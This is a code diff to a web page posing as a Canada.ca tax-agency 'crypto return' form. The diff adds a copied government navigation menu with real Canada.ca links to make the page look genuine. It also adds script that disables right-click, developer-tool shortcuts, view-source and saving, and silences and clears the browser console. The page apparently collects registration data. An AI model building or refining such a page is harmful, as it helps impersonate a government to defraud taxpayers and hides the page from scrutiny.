@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Submit crypto return - Step 1 - Canada.ca</title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico?v=2">
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
@@ -36,6 +38,13 @@
             background-color: #26374a;
             height: 50px;
         }
+        .nav-bar a {
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .nav-bar a:hover {
+            background-color: #1a2633;
+        }
         .red-accent {
             border-bottom: 4px solid #af3c43;
             display: inline-block;
@@ -60,6 +69,86 @@
         input:focus {
             outline: 2px solid #335075;
             outline-offset: 1px;
+        }
+        .gcweb-menu button[aria-haspopup="true"] {
+            background-color: #26374a;
+            border: 1px solid #26374a;
+            color: #fff;
+            padding: 0.5em 1em;
+            text-transform: uppercase;
+            font-size: 20px;
+        }
+        .gcweb-menu button[aria-haspopup="true"]:hover,
+        .gcweb-menu button[aria-haspopup="true"][aria-expanded="true"] {
+            background-color: #444;
+            border-color: #444;
+        }
+        .gcweb-menu [aria-haspopup="true"][aria-expanded="false"] + [role="menu"] {
+            display: none;
+        }
+        .gcweb-menu button[aria-haspopup="true"][aria-expanded="true"] + [role="menu"] {
+            display: block;
+            z-index: 9999;
+        }
+        .gcweb-menu [role="menu"] {
+            background-color: #444;
+            color: #fff;
+            list-style: none;
+            padding: 0;
+            position: absolute;
+            margin: 0;
+        }
+        .gcweb-menu [role="menu"] > li {
+            border-left: #444 solid 1px;
+        }
+        .gcweb-menu [role="menu"] > li:first-child {
+            border-top: #444 solid 1px;
+        }
+        .gcweb-menu [role="menu"] > li:last-child {
+            border-bottom: #444 solid 1px;
+        }
+        .gcweb-menu [role="menuitem"] {
+            display: block;
+            padding: 14px 30px;
+            width: 360px;
+            border-bottom: 1px solid #555;
+            color: #fff;
+            font-size: 18px;
+            text-decoration: none;
+        }
+        .gcweb-menu [role="menuitem"]:visited {
+            color: #fff;
+        }
+        .gcweb-menu li:last-child [role="menuitem"] {
+            border-bottom: none;
+        }
+        .gcweb-menu [role="menuitem"]:hover,
+        .gcweb-menu [role="menuitem"]:focus {
+            background-color: #fff;
+            color: #333;
+        }
+        /* Submenu styles */
+        .gcweb-menu .submenu {
+            display: none;
+            position: absolute;
+            left: 100%;
+            top: 0;
+            background-color: #444;
+            min-width: 300px;
+            margin: 0;
+            padding: 0;
+            list-style: none;
+        }
+        .gcweb-menu [role="presentation"]:hover > .submenu {
+            display: block;
+        }
+        .gcweb-menu .submenu [role="menuitem"] {
+            width: 300px;
+            font-size: 16px;
+            padding: 12px 20px;
+        }
+        .gcweb-menu [role="presentation"] {
+            position: relative;
         }
     </style>
 </head>
@@ -86,13 +175,138 @@
     <!-- Nav Bar -->
     <nav class="nav-bar">
         <div class="container-custom flex justify-between items-center h-full">
-            <button class="flex items-center space-x-2 bg-[#26374a] px-4 h-full font-bold text-white border-l border-r border-gray-700">
-                <span>MENU</span>
-                <i class="fas fa-caret-down"></i>
-            </button>
-            <button class="bg-[#26374a] px-4 h-full font-bold text-white flex items-center">
+            <div class="gcweb-menu">
+                <button type="button" aria-haspopup="true" aria-expanded="false">
+                    <span>MENU</span>
+                    <span class="glyphicon glyphicon-chevron-down"><i class="fas fa-caret-down"></i></span>
+                </button>
+                <ul role="menu" aria-orientation="vertical">
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://www.canada.ca/en/services/jobs.html">Jobs and the workplace</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.jobbank.gc.ca/findajob">Job Bank</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/jobs/opportunities/government.html">Government of Canada jobs</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/employment-social-development/services/sin.html">Apply for a Social Insurance Number (SIN)</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://www.canada.ca/en/services/immigration-citizenship.html">Immigration and citizenship</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/immigration-refugees-citizenship/services/visit-canada.html">Visit Canada</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/immigration-refugees-citizenship/services/immigrate-canada.html">Live in Canada permanently</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/immigration-refugees-citizenship/services/canadian-passports.html">Passports and travel documents</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://travel.gc.ca/">Travel and tourism</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://travel.gc.ca/travelling/advisories">Travel advice and advisories</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/immigration-refugees-citizenship/services/visit-canada.html">Visit Canada</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://travel.gc.ca/assistance/emergency-assistance">Emergency assistance abroad</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://www.canada.ca/en/services/business.html">Business and industry</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/business/start.html">Starting a business</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/business/taxes.html">Business taxes</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://ised-isde.canada.ca/cc/lgcy/fdrlCrpSrch.html?locale=en_CA">Find a corporation</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://www.canada.ca/en/services/benefits.html">Benefits</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/benefits/ei.html">Employment Insurance benefits</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/benefits/dental/dental-care-plan.html">Canadian Dental Care Plan</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/benefits/family.html">Family and caregiving benefits</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://www.canada.ca/en/services/health.html">Health</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/health/food-nutrition.html">Food and nutrition</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/public-health/services/diseases.html">Diseases and conditions</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://recalls-rappels.canada.ca/en">Recalls and safety alerts</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://www.canada.ca/en/services/taxes.html">Taxes</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/revenue-agency/services/e-services/cra-login-services.html">CRA sign in</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/taxes/income-tax.html">Income tax</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/revenue-agency/services/tax/businesses/topics/gst-hst-businesses.html">GST/HST</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/revenue-agency/services/payments.html">Payments</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://www.canada.ca/en/services/environment.html">Environment and natural resources</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/environment/weather.html">Weather and hazards</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/environment/energy.html">Energy</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://weather.gc.ca/canada_e.html">Local weather forecast</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://www.canada.ca/en/services/defence.html">National security and defence</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/defence/nationalsecurity.html">National security</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/defence/caf.html">Canadian Armed Forces</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://forces.ca/en/careers/">Jobs in the Forces</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://www.canada.ca/en/services/culture.html">Culture, history and sport</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/canadian-heritage/services/funding.html">Funding - Culture, history and sport</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/culture/sport.html">Sport</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/culture/history-heritage.html">History and heritage</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://www.canada.ca/en/services/policing.html">Policing, justice and emergencies</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/policing/police.html">Policing</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/policing/justice.html">Justice</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://rcmp.ca/en/firearms">Apply/Renew a firearms licence</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://www.canada.ca/en/services/transport.html">Transport and infrastructure</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://tc.canada.ca/en/aviation">Aviation</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://tc.canada.ca/en/marine-transportation">Marine transportation</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://tc.canada.ca/en/aviation/drone-safety">Drone safety</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://www.international.gc.ca/world-monde/index.aspx?lang=eng">Canada and the world</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.international.gc.ca/world-monde/international_relations-relations_internationales/index.aspx?lang=eng">Canada's foreign policy</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://travel.gc.ca/assistance/embassies-consulates">Contact an embassy or consulate</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://international.canada.ca/en/services/business/trade">International trade</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://www.canada.ca/en/services/finance.html">Money and finances</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/finance/manage.html">Managing your money</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/finance/debt.html">Debt and borrowing</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/finance/savings.html">Savings and investments</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" href="https://www.canada.ca/en/services/science.html">Science and innovation</a>
+                        <ul role="menu" class="submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/science/researchfunding.html">Research funding and awards</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/en/services/science/innovation.html">R&D and innovation</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://nrc.canada.ca/en/certifications-evaluations-standards/codes-canada/codes-canada-publications">National building codes</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </div>
+            <a href="https://www.canada.ca/en/revenue-agency.html" target="_blank" class="bg-[#26374a] px-4 h-full font-bold text-white flex items-center">
                 CRA sign in
-            </button>
+            </a>
         </div>
     </nav>
 
@@ -197,6 +411,68 @@
             localStorage.setItem('cra_register', JSON.stringify(data));
             window.location.href = 'declaration.html';
         });
+
+        // Menu toggle functionality
+        const menuButton = document.querySelector('.gcweb-menu button');
+        const dropdown = document.querySelector('.gcweb-menu [role="menu"]');
+        
+        if (menuButton && dropdown) {
+            menuButton.addEventListener('click', function(e) {
+                e.stopPropagation();
+                const isExpanded = this.getAttribute('aria-expanded') === 'true';
+                this.setAttribute('aria-expanded', !isExpanded);
+            });
+            
+            // Close dropdown when clicking outside
+            document.addEventListener('click', function(e) {
+                if (!e.target.closest('.gcweb-menu')) {
+                    menuButton.setAttribute('aria-expanded', 'false');
+                }
+            });
+            
+            // Close dropdown on escape key
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    menuButton.setAttribute('aria-expanded', 'false');
+                    menuButton.focus();
+                }
+            });
+        }
+    </script>
+
+    <script>
+        // Anti-scraping protection
+        (function() {
+            // Disable right-click
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
+            document.addEventListener('keydown', function(e) {
+                if (e.keyCode == 123 || // F12
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 73) || // Ctrl+Shift+I
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 74) || // Ctrl+Shift+J
+                    (e.ctrlKey && e.keyCode == 85) || // Ctrl+U
+                    (e.ctrlKey && e.keyCode == 83)) { // Ctrl+S
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            // Clear console logs periodically
+            setInterval(function() {
+                console.clear();
+            }, 1000);
+
+            // Disable console functions
+            console.log = function() {};
+            console.warn = function() {};
+            console.error = function() {};
+            console.info = function() {};
+            console.debug = function() {};
+        })();
     </script>
 
 </body>
